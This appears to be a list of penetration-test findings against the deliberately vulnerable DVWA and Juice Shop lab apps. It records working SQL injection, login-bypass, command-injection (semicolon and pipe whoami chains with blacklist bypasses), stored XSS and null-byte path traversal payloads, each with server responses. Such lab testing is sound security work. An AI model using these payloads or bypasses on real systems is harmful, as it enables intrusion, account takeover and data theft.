findings.title: DVWA SQL Injection (low) - boolean-based via id parameter
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned 5 user records (surnames: admin, Brown, Me, Picasso, Smith) - full names: admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith. FALSE payload id=1' AND '1'='2 returned zero records (page showed only 'User ID:' with no ID/First name/Surname pre_blocks). This confirms classic boolean-based SQL injection: the quote is not sanitized, OR '1'='1 always-true clause dumps all rows while AND '1'='2 always-false clause returns nothing.

findings.title: DVWA OS Command Injection (low) - semicolon chaining in ip parameter
findings.response_evidence: [security=low] Response included normal ping output for 127.0.0.1 (4 packets transmitted/received) immediately followed by an extra output line 'www-data' appended after the ping statistics block, which is the output of the injected 'whoami' command revealing the web server process identity. This confirms unsanitized shell command concatenation via the semicolon in the ip field.

findings.title: DVWA Stored XSS (low) - script execution via guestbook message field
findings.response_evidence: [security=low] After submitting the canary payload to mtxMessage and reloading the guestbook page in an authenticated browser context, browser_eval_js('window.xss_flag') returned 1, and browser_read_dom('#test_token') confirmed the injected <script id=\"test_token\"> element is present in the live DOM with inner_text 'window.xss_flag=1'. This proves the unsanitized message field is stored and rendered as executable HTML/JS rather than escaped text, confirming stored XSS.
findings.browser_js_evidence: window.xss_flag === 1 (evaluated in page context at http://dvwa/vulnerabilities/xss_s/); DOM selector #test_token inner_html_excerpt = "window.xss_flag=1"

findings.title: SQL Injection via numeric boolean payload in POST id field (DVWA medium security)
request_sequence: POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 OR 1=1', Submit: 'Submit'} (session=dvwa_admin, security=medium)
POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 AND 1=2', Submit: 'Submit'} (session=dvwa_admin, security=medium)
findings.response_evidence: [security=medium] Payload id=1 OR 1=1 (TRUE) returned 5 seeded user records: admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith (visible as repeated 'ID: 1 OR 1=1' blocks with First name/Surname pairs in pre_blocks). Payload id=1 AND 1=2 (FALSE) returned zero records - the response contained only the dropdown form with no First name/Surname output at all. This confirms unsanitized numeric SQL injection into the backend query since the id select dropdown normally only returns a single user record per submitted ID, but the boolean TRUE payload dumped the entire users table. Page confirmed 'Security Level: medium' in both responses.

findings.title: OS Command Injection via pipe bypass of ';' and '&&' blacklist (DVWA medium security)
request_sequence: POST http://dvwa/vulnerabilities/exec/ with form_data={ip: '127.0.0.1| whoami', Submit: 'Submit'} (session=dvwa_admin, security=medium)
findings.response_evidence: [security=medium] Payload ip=127.0.0.1| whoami bypassed the medium-level blacklist (which strips ';' and '&&' substrings but not the pipe character). The response's pre_blocks contained exactly 'www-data', confirming the whoami command executed server-side and disclosed the web server process identity. Page confirmed 'Security Level: medium' in the response.

findings.title: SQL Injection via out-of-band session-input id parameter (DVWA high security)
request_sequence: GET http://dvwa/vulnerabilities/sqli/  (renders stored id from session)
GET http://dvwa/vulnerabilities/sqli/  (renders stored id from session)
findings.response_evidence:
[security=high] Page confirmed at Security Level: high throughout testing.

TRUE payload (1' OR '1'='1' #) -> session-input.php echoed "Session ID: 1' OR '1'='1' #". Subsequent GET /vulnerabilities/sqli/ returned MULTIPLE seeded user records:
  ID: 1' OR '1'='1' # First name: admin Surname: admin
  ID: 1' OR '1'='1' # First name: Gordon Surname: Brown
  ID: 1' OR '1'='1' # First name: Hack Surname: Me
  ID: 1' OR '1'='1' # First name: Pablo Surname: Picasso
  ID: 1' OR '1'='1' # First name: Bob Surname: Smith

FALSE payload (1' AND '1'='2' #) -> session-input.php echoed "Session ID: 1' AND '1'='2' #". Subsequent GET /vulnerabilities/sqli/ returned ZERO records (no pre_blocks, no First name/Surname rows present in page body) — only the static "Click here to change your ID" prompt remained.

This differential TRUE(5 rows)/FALSE(0 rows) behavior with a trailing comment (#) to neutralize the server-appended LIMIT 1 clause confirms classic boolean-based SQL injection at DVWA high security via the out-of-band session-input.php endpoint.

findings.title: OS Command Injection via pipe (no trailing space) bypassing high-security blacklist on /vulnerabilities/exec/
findings.response_evidence:
[security=high] Page confirmed at Security Level: high (visible_text includes "Security Level: high"). Form fields unchanged (ip, Submit) confirming no additional CSRF token required.

Payload ip=127.0.0.1|whoami (pipe immediately followed by command, no space, bypassing the high-security blacklist of '; ', '| ', and '&&') produced response containing pre_blocks: ["www-data"], and visible_text: "...Enter an IP address: www-data More Information...". The output of the injected whoami command (www-data, the web server process identity) appearing directly in the ping output area confirms successful OS command injection at DVWA high security.

findings.title: Cross-User Basket Access (BOLA) - acct2 can read acct1's basket
request_sequence: GET /rest/basket/6 (session=juiceshop_acct1, Bearer JWT acct1) -> 200, basket id=6 UserId=22 Products=[{name:'Apple Juice (1000ml)', BasketItem.quantity:3}]
GET /rest/basket/6 (session=juiceshop_acct2, Bearer JWT acct2, own_basket_id=7) -> 200, returns the SAME basket id=6 UserId=22 Products=[{name:'Apple Juice (1000ml)', BasketItem.quantity:3}]
findings.response_evidence: acct1's own basket (id=6, UserId=22) contains the distinct seeded item 'Apple Juice (1000ml)' with BasketItem.quantity=3. When authenticated as juiceshop_acct2 (whose own_basket_id is 7), issuing GET /rest/basket/6 returned HTTP 200 with the identical basket content: {"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)",...,"BasketItem":{"BasketId":6,"quantity":3}}]}. No authorization check prevented acct2 from retrieving acct1's basket by ID, confirming BOLA / CWE-639.

findings.title: Authentication Bypass via SQL Injection in login email field
findings.response_evidence: Submitting email=`' OR 1=1--` with an arbitrary password to /rest/user/login returned HTTP 200 with a valid authentication object containing a JWT token and umail=\"admin@juice-sh.op\" (bid:1), i.e. the backend SQL query `SELECT * FROM Users WHERE email='<input>' AND password='[REDACTED]'` was short-circuited by the injected `OR 1=1--` comment, returning the first user record (admin) and issuing a valid auth token without knowing the real password. This confirms SQL injection-based authentication bypass (CWE-89).

findings.title: Product Search SQL Injection (error-based and UNION-based)
request_sequence: GET /rest/products/search?q=qwert' session=unauth -> 500, body: "Error: SQLITE_ERROR: near \"'%'\": syntax error"
findings.response_evidence: A single unescaped quote in the search parameter (q=qwert') caused an unhandled backend SQL error: HTTP 500 with body \"Error: SQLITE_ERROR: near \\\"'%'\\\": syntax error\", proving the parameter is concatenated directly into a SQL LIKE query without sanitization. A crafted UNION-based payload (q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--) closed the original query's parentheses/string and successfully appended a 9-column UNION SELECT, returning HTTP 200 with attacker-controlled literal values echoed back as a product record ({"id":1,"name":2,"description":3,...}), confirming successful SQL injection (CWE-89) including UNION-based data extraction capability.

findings.title: Poison Null-Byte Path Traversal Bypasses /ftp/ Extension Filter
findings.response_evidence:
Step 1: GET /ftp/package.json.bak returned HTTP 403 with body: "Error: Only .md and .pdf files are allowed!" and a stack trace pointing to verify() in /juice-shop/build/routes/fileServer.js:55 — confirming the extension allowlist filter blocks direct .bak access.

Step 2: GET /ftp/package.json.bak%2500.md (URL-encoded null byte '%2500' decodes server-side to a literal null byte followed by '.md') returned HTTP 200 with content_type application/octet-stream and the full content of package.json, e.g.: {"name": "juice-shop", "version": "6.2.0-SNAPSHOT", "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...}}.

This demonstrates that appending the allowed extension after a URL-encoded null byte bypasses the filename extension filter, allowing retrieval of the restricted .bak backup file content — a classic poison null-byte path traversal/filter bypass (CWE-22).
